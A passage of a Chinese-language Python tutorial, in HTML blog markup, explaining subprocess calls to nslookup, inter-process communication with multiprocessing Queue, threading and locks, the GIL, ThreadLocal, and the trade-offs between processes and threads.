subprocess</span><br><span class="line"></span><br><span class="line">print(&#x27;$ nslookup www.python.org&#x27;)</span><br><span class="line">r = subprocess.call([&#x27;nslookup&#x27;, &#x27;www.python.org&#x27;])</span><br><span class="line">print(&#x27;Exit code:&#x27;, r)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup www.python.org</span><br><span class="line">Server:        192.168.19.4</span><br><span class="line">Address:    192.168.19.4#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.python.org    canonical name = python.map.fastly.net.</span><br><span class="line">Name:    python.map.fastly.net</span><br><span class="line">Address: 199.27.79.223</span><br><span class="line"></span><br><span class="line">Exit code: 0</span><br></pre></td></tr></table></figure><p>如果子进程还需要输入，则可以通过<code>communicate()</code>方法输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">print(&#x27;$ nslookup&#x27;)</span><br><span class="line">p = subprocess.Popen([&#x27;nslookup&#x27;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">output, err = p.communicate(b&#x27;set q=mx\npython.org\nexit\n&#x27;)</span><br><span class="line">print(output.decode(&#x27;utf-8&#x27;))</span><br><span class="line">print(&#x27;Exit code:&#x27;, p.returncode)</span><br></pre></td></tr></table></figure><p>上面的代码相当于在命令行执行命令<code>nslookup</code>，然后手动输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set q=mx</span><br><span class="line">python.org</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup</span><br><span class="line">Server:        192.168.19.4</span><br><span class="line">Address:    192.168.19.4#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">python.org    mail exchanger = 50 mail.python.org.</span><br><span class="line"></span><br><span class="line">Authoritative answers can be found from:</span><br><span class="line">mail.python.org    internet address = 82.94.164.166</span><br><span class="line">mail.python.org    has AAAA address 2001:888:2000:d::a6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exit code: 0</span><br></pre></td></tr></table></figure><h3 id="10-1-4-进程间通信"><a href="#10-1-4-进程间通信" class="headerlink" title="10.1.4 进程间通信"></a>10.1.4 进程间通信</h3><p><code>Process</code>之间肯定是需要通信的，操作系统提供了很多机制来实现进程间的通信。Python的<code>multiprocessing</code>模块包装了底层的机制，提供了<code>Queue</code>、<code>Pipes</code>等多种方式来交换数据。</p><p>我们以<code>Queue</code>为例，在父进程中创建两个子进程，一个往<code>Queue</code>里写数据，一个从<code>Queue</code>里读数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process, Queue</span><br><span class="line">import os, time, random</span><br><span class="line"></span><br><span class="line"># 写数据进程执行的代码:</span><br><span class="line">def write(q):</span><br><span class="line">    print(&#x27;Process to write: %s&#x27; % os.getpid())</span><br><span class="line">    for value in [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]:</span><br><span class="line">        print(&#x27;Put %s to queue...&#x27; % value)</span><br><span class="line">        q.put(value)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"></span><br><span class="line"># 读数据进程执行的代码:</span><br><span class="line">def read(q):</span><br><span class="line">    print(&#x27;Process to read: %s&#x27; % os.getpid())</span><br><span class="line">    while True:</span><br><span class="line">        value = q.get(True)</span><br><span class="line">        print(&#x27;Get %s from queue.&#x27; % value)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    # 父进程创建Queue，并传给各个子进程：</span><br><span class="line">    q = Queue()</span><br><span class="line">    pw = Process(target=write, args=(q,))</span><br><span class="line">    pr = Process(target=read, args=(q,))</span><br><span class="line">    # 启动子进程pw，写入:</span><br><span class="line">    pw.start()</span><br><span class="line">    # 启动子进程pr，读取:</span><br><span class="line">    pr.start()</span><br><span class="line">    # 等待pw结束:</span><br><span class="line">    pw.join()</span><br><span class="line">    # pr进程里是死循环，无法等待其结束，只能强行终止:</span><br><span class="line">    pr.terminate()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Process to write: 50563</span><br><span class="line">Put A to queue...</span><br><span class="line">Process to read: 50564</span><br><span class="line">Get A from queue.</span><br><span class="line">Put B to queue...</span><br><span class="line">Get B from queue.</span><br><span class="line">Put C to queue...</span><br><span class="line">Get C from queue.</span><br></pre></td></tr></table></figure><p>在Unix&#x2F;Linux下，<code>multiprocessing</code>模块封装了<code>fork()</code>调用，使我们不需要关注<code>fork()</code>的细节。由于Windows没有<code>fork</code>调用，因此，<code>multiprocessing</code>需要“模拟”出<code>fork</code>的效果，父进程所有Python对象都必须通过pickle序列化再传到子进程去，所以，如果<code>multiprocessing</code>在Windows下调用失败了，要先考虑是不是pickle失败了。</p><blockquote><p>小结：</p></blockquote><p>在Unix&#x2F;Linux下，可以使用<code>fork()</code>调用实现多进程。</p><p>要实现跨平台的多进程，可以使用<code>multiprocessing</code>模块。</p><p>进程间通信是通过<code>Queue</code>、<code>Pipes</code>等实现的。</p><h2 id="10-2-多线程"><a href="#10-2-多线程" class="headerlink" title="10.2 多线程"></a>10.2 多线程</h2><p>多任务可以由多进程完成，也可以由一个进程内的多线程完成。</p><p>我们前面提到了进程是由若干线程组成的，一个进程至少有一个线程。</p><p>由于线程是操作系统直接支持的执行单元，因此，高级语言通常都内置多线程的支持，Python也不例外，并且，Python的线程是真正的Posix Thread，而不是模拟出来的线程。</p><p>Python的标准库提供了两个模块：<code>_thread</code>和<code>threading</code>，<code>_thread</code>是低级模块，<code>threading</code>是高级模块，对<code>_thread</code>进行了封装。绝大多数情况下，我们只需要使用<code>threading</code>这个高级模块。</p><p>启动一个线程就是把一个函数传入并创建<code>Thread</code>实例，然后调用<code>start()</code>开始执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line"></span><br><span class="line"># 新线程执行的代码:</span><br><span class="line">def loop():</span><br><span class="line">    print(&#x27;thread %s is running...&#x27; % threading.current_thread().name)</span><br><span class="line">    n = 0</span><br><span class="line">    while n &lt; 5:</span><br><span class="line">        n = n + 1</span><br><span class="line">        print(&#x27;thread %s &gt;&gt;&gt; %s&#x27; % (threading.current_thread().name, n))</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    print(&#x27;thread %s ended.&#x27; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">print(&#x27;thread %s is running...&#x27; % threading.current_thread().name)</span><br><span class="line">t = threading.Thread(target=loop, name=&#x27;LoopThread&#x27;)</span><br><span class="line">t.start()</span><br><span class="line">t.join()</span><br><span class="line">print(&#x27;thread %s ended.&#x27; % threading.current_thread().name)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">thread MainThread is running...</span><br><span class="line">thread LoopThread is running...</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 1</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 2</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 3</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 4</span><br><span class="line">thread LoopThread &gt;&gt;&gt; 5</span><br><span class="line">thread LoopThread ended.</span><br><span class="line">thread MainThread ended.</span><br></pre></td></tr></table></figure><p>由于任何进程默认就会启动一个线程，我们把该线程称为主线程，主线程又可以启动新的线程，Python的<code>threading</code>模块有个<code>current_thread()</code>函数，它永远返回当前线程的实例。主线程实例的名字叫<code>MainThread</code>，子线程的名字在创建时指定，我们用<code>LoopThread</code>命名子线程。名字仅仅在打印时用来显示，完全没有其他意义，如果不起名字Python就自动给线程命名为<code>Thread-1</code>，<code>Thread-2</code>……</p><h3 id="10-2-1-Lock"><a href="#10-2-1-Lock" class="headerlink" title="10.2.1 Lock"></a>10.2.1 Lock</h3><p>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p><p>来看看多个线程同时操作一个变量怎么把内容给改乱了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line"></span><br><span class="line"># 假定这是你的银行存款:</span><br><span class="line">balance = 0</span><br><span class="line"></span><br><span class="line">def change_it(n):</span><br><span class="line">    # 先存后取，结果应该为0:</span><br><span class="line">    global balance</span><br><span class="line">    balance = balance + n</span><br><span class="line">    balance = balance - n</span><br><span class="line"></span><br><span class="line">def run_thread(n):</span><br><span class="line">    for i in range(2000000):</span><br><span class="line">        change_it(n)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=run_thread, args=(5,))</span><br><span class="line">t2 = threading.Thread(target=run_thread, args=(8,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br><span class="line">print(balance)</span><br></pre></td></tr></table></figure><p>我们定义了一个共享变量<code>balance</code>，初始值为<code>0</code>，并且启动两个线程，先存后取，理论上结果应该为<code>0</code>，但是，由于线程的调度是由操作系统决定的，当t1、t2交替执行时，只要循环次数足够多，<code>balance</code>的结果就不一定是<code>0</code>了。</p><p>原因是因为高级语言的一条语句在CPU执行时是若干条语句，即使一个简单的计算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">balance = balance + n</span><br></pre></td></tr></table></figure><p>也分两步：</p><ol><li>计算<code>balance + n</code>，存入临时变量中；</li><li>将临时变量的值赋给<code>balance</code>。</li></ol><p>也就是可以看成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = balance + n</span><br><span class="line">balance = x</span><br></pre></td></tr></table></figure><p>由于x是局部变量，两个线程各自都有自己的x，当代码正常执行时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">初始值 balance = 0</span><br><span class="line"></span><br><span class="line">t1: x1 = balance + 5 # x1 = 0 + 5 = 5</span><br><span class="line">t1: balance = x1     # balance = 5</span><br><span class="line">t1: x1 = balance - 5 # x1 = 5 - 5 = 0</span><br><span class="line">t1: balance = x1     # balance = 0</span><br><span class="line"></span><br><span class="line">t2: x2 = balance + 8 # x2 = 0 + 8 = 8</span><br><span class="line">t2: balance = x2     # balance = 8</span><br><span class="line">t2: x2 = balance - 8 # x2 = 8 - 8 = 0</span><br><span class="line">t2: balance = x2     # balance = 0</span><br><span class="line">    </span><br><span class="line">结果 balance = 0</span><br></pre></td></tr></table></figure><p>但是t1和t2是交替运行的，如果操作系统以下面的顺序执行t1、t2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">初始值 balance = 0</span><br><span class="line"></span><br><span class="line">t1: x1 = balance + 5  # x1 = 0 + 5 = 5</span><br><span class="line"></span><br><span class="line">t2: x2 = balance + 8  # x2 = 0 + 8 = 8</span><br><span class="line">t2: balance = x2      # balance = 8</span><br><span class="line"></span><br><span class="line">t1: balance = x1      # balance = 5</span><br><span class="line">t1: x1 = balance - 5  # x1 = 5 - 5 = 0</span><br><span class="line">t1: balance = x1      # balance = 0</span><br><span class="line"></span><br><span class="line">t2: x2 = balance - 8  # x2 = 0 - 8 = -8</span><br><span class="line">t2: balance = x2      # balance = -8</span><br><span class="line"></span><br><span class="line">结果 balance = -8</span><br></pre></td></tr></table></figure><p>究其原因，是因为修改<code>balance</code>需要多条语句，而执行这几条语句时，线程可能中断，从而导致多个线程把同一个对象的内容改乱了。</p><p>两个线程同时一存一取，就可能导致余额不对，你肯定不希望你的银行存款莫名其妙地变成了负数，所以，我们必须确保一个线程在修改<code>balance</code>的时候，别的线程一定不能改。</p><p>如果我们要确保<code>balance</code>计算正确，就要给<code>change_it()</code>上一把锁，当某个线程开始执行<code>change_it()</code>时，我们说，该线程因为获得了锁，因此其他线程不能同时执行<code>change_it()</code>，只能等待，直到锁被释放后，获得该锁以后才能改。由于锁只有一个，无论多少线程，同一时刻最多只有一个线程持有该锁，所以，不会造成修改的冲突。创建一个锁就是通过<code>threading.Lock()</code>来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">balance = 0</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">def run_thread(n):</span><br><span class="line">    for i in range(100000):</span><br><span class="line">        # 先要获取锁:</span><br><span class="line">        lock.acquire()</span><br><span class="line">        try:</span><br><span class="line">            # 放心地改吧:</span><br><span class="line">            change_it(n)</span><br><span class="line">        finally:</span><br><span class="line">            # 改完了一定要释放锁:</span><br><span class="line">            lock.release()</span><br></pre></td></tr></table></figure><p>当多个线程同时执行<code>lock.acquire()</code>时，只有一个线程能成功地获取锁，然后继续执行代码，其他线程就继续等待直到获得锁为止。</p><p>获得锁的线程用完后一定要释放锁，否则那些苦苦等待锁的线程将永远等待下去，成为死线程。所以我们用<code>try...finally</code>来确保锁一定会被释放。</p><p>锁的好处就是确保了某段关键代码只能由一个线程从头到尾完整地执行，坏处当然也很多，首先是阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了。其次，由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁，导致多个线程全部挂起，既不能执行，也无法结束，只能靠操作系统强制终止。</p><h3 id="10-2-2-多核-CPU"><a href="#10-2-2-多核-CPU" class="headerlink" title="10.2.2 多核 CPU"></a>10.2.2 多核 CPU</h3><p>如果你不幸拥有一个多核CPU，你肯定在想，多核应该可以同时执行多个线程。</p><p>如果写一个死循环的话，会出现什么情况呢？</p><p>打开Mac OS X的Activity Monitor，或者Windows的Task Manager，都可以监控某个进程的CPU使用率。</p><p>我们可以监控到一个死循环线程会100%占用一个CPU。</p><p>如果有两个死循环线程，在多核CPU中，可以监控到会占用200%的CPU，也就是占用两个CPU核心。</p><p>要想把N核CPU的核心全部跑满，就必须启动N个死循环线程。</p><p>试试用Python写个死循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import threading, multiprocessing</span><br><span class="line"></span><br><span class="line">def loop():</span><br><span class="line">    x = 0</span><br><span class="line">    while True:</span><br><span class="line">        x = x ^ 1</span><br><span class="line"></span><br><span class="line">for i in range(multiprocessing.cpu_count()):</span><br><span class="line">    t = threading.Thread(target=loop)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>启动与CPU核心数量相同的N个线程，在4核CPU上可以监控到CPU占用率仅有102%，也就是仅使用了一核。</p><p>但是用C、C++或Java来改写相同的死循环，直接可以把全部核心跑满，4核就跑到400%，8核就跑到800%，为什么Python不行呢？</p><p>因为Python的线程虽然是真正的线程，但解释器执行代码时，有一个GIL锁：Global Interpreter Lock，任何Python线程执行前，必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。</p><p>GIL是Python解释器设计的历史遗留问题，通常我们用的解释器是官方实现的CPython，要真正利用多核，除非重写一个不带GIL的解释器。</p><p>所以，在Python中，可以使用多线程，但不要指望能有效利用多核。如果一定要通过多线程利用多核，那只能通过C扩展来实现，不过这样就失去了Python简单易用的特点。</p><p>不过，也不用过于担心，Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。</p><blockquote><p>小结：</p></blockquote><p>多线程编程，模型复杂，容易发生冲突，必须用锁加以隔离，同时，又要小心死锁的发生。</p><p>Python解释器由于设计时有GIL全局锁，导致了多线程无法利用多核。多线程的并发在Python中就是一个美丽的梦。</p><h2 id="10-3-ThreadLocal"><a href="#10-3-ThreadLocal" class="headerlink" title="10.3 ThreadLocal"></a>10.3 ThreadLocal</h2><p>在多线程环境下，每个线程都有自己的数据。一个线程使用自己的局部变量比使用全局变量好，因为局部变量只有线程自己能看见，不会影响其他线程，而全局变量的修改必须加锁。</p><p>但是局部变量也有问题，就是在函数调用的时候，传递起来很麻烦：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def process_student(name):</span><br><span class="line">    std = Student(name)</span><br><span class="line">    # std是局部变量，但是每个函数都要用它，因此必须传进去：</span><br><span class="line">    do_task_1(std)</span><br><span class="line">    do_task_2(std)</span><br><span class="line"></span><br><span class="line">def do_task_1(std):</span><br><span class="line">    do_subtask_1(std)</span><br><span class="line">    do_subtask_2(std)</span><br><span class="line"></span><br><span class="line">def do_task_2(std):</span><br><span class="line">    do_subtask_2(std)</span><br><span class="line">    do_subtask_2(std)</span><br></pre></td></tr></table></figure><p>每个函数一层一层调用都这么传参数那还得了？用全局变量？也不行，因为每个线程处理不同的<code>Student</code>对象，不能共享。</p><p>如果用一个全局<code>dict</code>存放所有的<code>Student</code>对象，然后以<code>thread</code>自身作为<code>key</code>获得线程对应的<code>Student</code>对象如何？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">global_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">def std_thread(name):</span><br><span class="line">    std = Student(name)</span><br><span class="line">    # 把std放到全局变量global_dict中：</span><br><span class="line">    global_dict[threading.current_thread()] = std</span><br><span class="line">    do_task_1()</span><br><span class="line">    do_task_2()</span><br><span class="line"></span><br><span class="line">def do_task_1():</span><br><span class="line">    # 不传入std，而是根据当前线程查找：</span><br><span class="line">    std = global_dict[threading.current_thread()]</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">def do_task_2():</span><br><span class="line">    # 任何函数都可以查找出当前线程的std变量：</span><br><span class="line">    std = global_dict[threading.current_thread()]</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>这种方式理论上是可行的，它最大的优点是消除了<code>std</code>对象在每层函数中的传递问题，但是，每个函数获取<code>std</code>的代码有点丑。</p><p>有没有更简单的方式？</p><p><code>ThreadLocal</code>应运而生，不用查找<code>dict</code>，<code>ThreadLocal</code>帮你自动做这件事：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">    </span><br><span class="line"># 创建全局ThreadLocal对象:</span><br><span class="line">local_school = threading.local()</span><br><span class="line"></span><br><span class="line">def process_student():</span><br><span class="line">    # 获取当前线程关联的student:</span><br><span class="line">    std = local_school.student</span><br><span class="line">    print(&#x27;Hello, %s (in %s)&#x27; % (std, threading.current_thread().name))</span><br><span class="line"></span><br><span class="line">def process_thread(name):</span><br><span class="line">    # 绑定ThreadLocal的student:</span><br><span class="line">    local_school.student = name</span><br><span class="line">    process_student()</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target= process_thread, args=(&#x27;Alice&#x27;,), name=&#x27;Thread-A&#x27;)</span><br><span class="line">t2 = threading.Thread(target= process_thread, args=(&#x27;Bob&#x27;,), name=&#x27;Thread-B&#x27;)</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello, Alice (in Thread-A)</span><br><span class="line">Hello, Bob (in Thread-B)</span><br></pre></td></tr></table></figure><p>全局变量<code>local_school</code>就是一个<code>ThreadLocal</code>对象，每个<code>Thread</code>对它都可以读写<code>student</code>属性，但互不影响。你可以把<code>local_school</code>看成全局变量，但每个属性如<code>local_school.student</code>都是线程的局部变量，可以任意读写而互不干扰，也不用管理锁的问题，<code>ThreadLocal</code>内部会处理。</p><p>可以理解为全局变量<code>local_school</code>是一个<code>dict</code>，不但可以用<code>local_school.student</code>，还可以绑定其他变量，如<code>local_school.teacher</code>等等。</p><p><code>ThreadLocal</code>最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源。</p><blockquote><p>小结：</p></blockquote><p>一个<code>ThreadLocal</code>变量虽然是全局变量，但每个线程都只能读写自己线程的独立副本，互不干扰。<code>ThreadLocal</code>解决了参数在一个线程中各个函数之间互相传递的问题。</p><h2 id="10-4-进程-vs-线程"><a href="#10-4-进程-vs-线程" class="headerlink" title="10.4 进程 vs. 线程"></a>10.4 进程 vs. 线程</h2><p>我们介绍了多进程和多线程，这是实现多任务最常用的两种方式。现在，我们来讨论一下这两种方式的优缺点。</p><p>首先，要实现多任务，通常我们会设计Master-Worker模式，Master负责分配任务，Worker负责执行任务，因此，多任务环境下，通常是一个Master，多个Worker。</p><p>如果用多进程实现Master-Worker，主进程就是Master，其他进程就是Worker。</p><p>如果用多线程实现Master-Worker，主线程就是Master，其他线程就是Worker。</p><p>多进程模式最大的优点就是稳定性高，因为一个子进程崩溃了，不会影响主进程和其他子进程。（当然主进程挂了所有进程就全挂了，但是Master进程只负责分配任务，挂掉的概率低）著名的Apache最早就是采用多进程模式。</p><p>多进程模式的缺点是创建进程的代价大，在Unix&#x2F;Linux系统下，用<code>fork</code>调用还行，在Windows下创建进程开销巨大。另外，操作系统能同时运行的进程数也是有限的，在内存和CPU的限制下，如果有几千个进程同时运行，操作系统连调度都会成问题。</p><p>多线程模式通常比多进程快一点，但是也快不到哪去，而且，多线程模式致命的缺点就是任何一个线程挂掉都可能直接造成整个进程崩溃，因为所有线程共享进程的内存。在Windows上，如果一个线程执行的代码出了问题，你经常可以看到这样的提示：“该程序执行了非法操作，即将关闭”，其实往往是某个线程出了问题，但是操作系统会强制结束整个进程。</p><p>在Windows下，多线程的效率比多进程要高，所以微软的IIS服务器默认采用多线程模式。由于多线程存在稳定性的问题，IIS的稳定性就不如Apache。为了缓解这个问题，IIS和Apache现在又有多进程+多线程的混合模式，真是把问题越搞越复杂。</p><h3 id="10-4-1-线程切换"><a href="#10-4-1-线程切换" class="headerlink" title="10.4.1 线程切换"></a>10.4.1 线程切换</h3><p>无论是多进程还是多线程，只要数量一多，效率肯定上不去，为什么呢？</p><p>我们打个比方，假设你不幸正在准备中考，每天晚上需要做语文、数学、英语、物理、化学这5科的作业，每项作业耗时1小时。</p><p>如果你先花1小时做语文作业，做完了，再花1小时做数学作业，这样，依次全部做完，一共花5小时，这种方式称为单任务模型，或者批处理任务模型。</p><p>假设你打算切换到多任务模型，可以先做1分钟语文，再切换到数学作业，做1分钟，再切换到英语，以此类推，只要切换速度足够快，这种方式就和单核CPU执行多任务是一样的了，以幼儿园小朋友的眼光来看，你就正在同时写5科作业。</p><p>但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。</p><p>所以，多任务一旦多到一个限度，就会消耗掉系统所有的资源，结果效率急剧下降，所有任务都做不好。</p><h3 id="10-4-2-计算密集型-vs-IO密集型"><a href="#10-4-2-计算密集型-vs-IO密集型" class="headerlink" title="10.4.2 计算密集型 vs. IO密集型"></a>10.4.2 计算密集型 vs. 